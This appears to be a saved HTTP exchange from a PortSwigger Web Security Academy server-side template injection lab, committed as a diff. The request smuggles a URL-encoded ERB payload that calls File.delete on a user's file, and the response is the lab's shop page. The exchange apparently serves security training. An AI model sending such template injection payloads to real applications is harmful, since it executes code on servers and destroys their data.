@@ -1,0 +1,218 @@
+GET https://0a4100ac04e544ad8262abba00ac0024.web-security-academy.net/?message=%3C%25=%20File.delete(%22/home/carlos/morale.txt%22)%25%3E HTTP/1.1
+host: 0a4100ac04e544ad8262abba00ac0024.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Cookie: session=RJN1O3FTl4uf8qzbJ0W9bFiwQd1kJUus
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 10558
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>Basic server-side template injection</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>Basic server-side template injection</h2>
+                            <a class=link-back href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <div>1
+</div>
+                    <section class="container-list-tiles">
+                        <div>
+                            <img src="/image/productcatalog/products/45.jpg">
+                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
+                            <img src="/resources/images/rating4.png">
+                            $81.62
+                            <a class="button" href="/product?productId=1">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/13.jpg">
+                            <h3>Inflatable Dartboard</h3>
+                            <img src="/resources/images/rating2.png">
+                            $35.03
+                            <a class="button" href="/product?productId=2">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/61.jpg">
+                            <h3>Safety First</h3>
+                            <img src="/resources/images/rating3.png">
+                            $45.22
+                            <a class="button" href="/product?productId=3">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/27.jpg">
+                            <h3>The Trolley-ON</h3>
+                            <img src="/resources/images/rating4.png">
+                            $23.36
+                            <a class="button" href="/product?productId=4">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/54.jpg">
+                            <h3>Robot Home Security Buddy</h3>
+                            <img src="/resources/images/rating4.png">
+                            $61.90
+                            <a class="button" href="/product?productId=5">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/38.jpg">
+                            <h3>Six Pack Beer Belt</h3>
+                            <img src="/resources/images/rating2.png">
+                            $49.55
+                            <a class="button" href="/product?productId=6">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/63.jpg">
+                            <h3>Laser Tag</h3>
+                            <img src="/resources/images/rating1.png">
+                            $91.11
+                            <a class="button" href="/product?productId=7">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/14.jpg">
+                            <h3>Mood Enhancer</h3>
+                            <img src="/resources/images/rating1.png">
+                            $8.06
+                            <a class="button" href="/product?productId=8">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/60.jpg">
+                            <h3>Dancing In The Dark</h3>
+                            <img src="/resources/images/rating4.png">
+                            $13.76
+                            <a class="button" href="/product?productId=9">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/17.jpg">
+                            <h3>Picture Box</h3>
+                            <img src="/resources/images/rating5.png">
+                            $10.40
+                            <a class="button" href="/product?productId=10">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/30.jpg">
+                            <h3>Giant Pillow Thing</h3>
+                            <img src="/resources/images/rating2.png">
+                            $15.36
+                            <a class="button" href="/product?productId=11">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/68.jpg">
+                            <h3>What Do You Meme?</h3>
+                            <img src="/resources/images/rating1.png">
+                            $72.25
+                            <a class="button" href="/product?productId=12">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/74.jpg">
+                            <h3>Packaway Carport</h3>
+                            <img src="/resources/images/rating4.png">
+                            $57.05
+                            <a class="button" href="/product?productId=13">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/43.jpg">
+                            <h3>First Impression Costumes</h3>
+                            <img src="/resources/images/rating4.png">
+                            $79.74
+                            <a class="button" href="/product?productId=14">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/70.jpg">
+                            <h3>Eye Projectors</h3>
+                            <img src="/resources/images/rating4.png">
+                            $38.01
+                            <a class="button" href="/product?productId=15">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/5.jpg">
+                            <h3>Cheshire Cat Grin</h3>
+                            <img src="/resources/images/rating2.png">
+                            $59.43
+                            <a class="button" href="/product?productId=16">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/62.jpg">
+                            <h3>Weird Crushes Game</h3>
+                            <img src="/resources/images/rating4.png">
+                            $84.24
+                            <a class="button" href="/product?productId=17">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/46.jpg">
+                            <h3>Hitch A Lift</h3>
+                            <img src="/resources/images/rating3.png">
+                            $0.85
+                            <a class="button" href="/product?productId=18">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/24.jpg">
+                            <h3>The Alternative Christmas Tree</h3>
+                            <img src="/resources/images/rating1.png">
+                            $39.59
+                            <a class="button" href="/product?productId=19">View details</a>
+                        </div>
+                        <div>
+                            <img src="/image/productcatalog/products/51.jpg">
+                            <h3>Real Life Photoshopping</h3>
+                            <img src="/resources/images/rating5.png">
+                            $86.30
+                            <a class="button" href="/product?productId=20">View details</a>
+                        </div>
+                    </section>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
